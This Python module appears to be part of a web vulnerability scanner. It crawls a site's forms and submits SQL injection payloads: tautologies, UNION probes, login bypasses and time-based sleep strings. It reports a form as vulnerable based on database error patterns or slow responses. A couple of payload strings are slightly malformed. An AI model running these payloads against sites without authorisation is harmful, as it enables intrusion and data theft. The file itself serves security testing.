from .vulnerability_scanner import VulnerabilityScanner
import re

class SQLScanner(VulnerabilityScanner):
    def __init__(self, url):
        super().__init__(url)
        self.sql_payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "1' ORDER BY 1--+",
            "1' UNION SELECT NULL--+",
            "admin' --",
            "' UNION SELECT @@version --",
            "1'; WAIT FOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--"
        ]
        
        self.error_patterns = [
            re.compile(r"SQL syntax.*MySQL", re.I),
            re.compile(r"Warning.*mysql_.*", re.I),
            re.compile(r"PostgreSQL.*ERROR", re.I),
            re.compile(r"SQLite/JDBCDriver", re.I),
            re.compile(r"SQLite\.Exception", re.I),
            re.compile(r"System\.Data\.SQLite\.SQLiteException", re.I),
            re.compile(r"Oracle.*Driver", re.I),
            re.compile(r"Microsoft SQL Server", re.I),
            re.compile(r"ODBC.*Driver", re.I),
            re.compile(r"Warning.*pg_.*", re.I)
        ]

    def test_sql_injection(self, url, form_details):
        """Test SQL injection payloads in a form."""
        try:
            for input_tag in form_details["inputs"]:
                if input_tag["type"] in ["text", "search", "url", "email", "password"]:
                    for payload in self.sql_payloads:
                        data = {}
                        for input_field in form_details["inputs"]:
                            if input_field["type"] != "submit":
                                data[input_field["name"]] = payload
                        
                        if form_details["method"] == "post":
                            response = self.session.post(url, data=data)
                        else:
                            response = self.session.get(url, params=data)

                        if self.is_sql_vulnerable(response.text):
                            self.add_vulnerability(
                                f"SQL Injection vulnerability found in form at {url}",
                                "critical",
                                f"Form action: {form_details['action']}, Input: {input_tag['name']}, Payload: {payload}"
                            )
                            return True
        except Exception as e:
            self.logger.error(f"Error testing SQL injection: {str(e)}")
        return False

    def is_sql_vulnerable(self, response_text):
        """Check if the response contains SQL error messages."""
        for pattern in self.error_patterns:
            if pattern.search(response_text):
                return True
        return False

    def check_time_based_injection(self, url, form_details):
        """Test for time-based SQL injection vulnerabilities."""
        try:
            # Use time-based payloads
            time_based_payloads = [
                "1'; SELECT SLEEP(5)--",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1'; pg_sleep(5)--"
            ]

            for input_tag in form_details["inputs"]:
                if input_tag["type"] in ["text", "search", "url", "email", "password"]:
                    for payload in time_based_payloads:
                        data = {}
                        for input_field in form_details["inputs"]:
                            if input_field["type"] != "submit":
                                data[input_field["name"]] = payload

                        import time
                        start_time = time.time()
                        
                        if form_details["method"] == "post":
                            response = self.session.post(url, data=data)
                        else:
                            response = self.session.get(url, params=data)
                            
                        execution_time = time.time() - start_time

                        # If response takes more than 4 seconds, it might be vulnerable
                        if execution_time > 4:
                            self.add_vulnerability(
                                f"Potential time-based SQL Injection found in form at {url}",
                                "high",
                                f"Form action: {form_details['action']}, Input: {input_tag['name']}, Response time: {execution_time:.2f}s"
                            )
                            return True

        except Exception as e:
            self.logger.error(f"Error testing time-based SQL injection: {str(e)}")
        return False

    def scan_url(self):
        """Perform SQL injection vulnerability scan."""
        self.logger.info(f"Starting SQL injection scan for {self.url}")
        
        try:
            # Crawl and find forms
            self.crawl()

            # Test each form for both error-based and time-based SQL injection
            for form in self.forms:
                form_details = self.get_form_details(form)
                
                # Test for error-based SQL injection
                if self.test_sql_injection(self.url, form_details):
                    continue
                
                # Test for time-based SQL injection
                self.check_time_based_injection(self.url, form_details)

        except Exception as e:
            self.logger.error(f"Error during SQL injection scan: {str(e)}")
        finally:
            self.clean_session()

        return self.get_results()
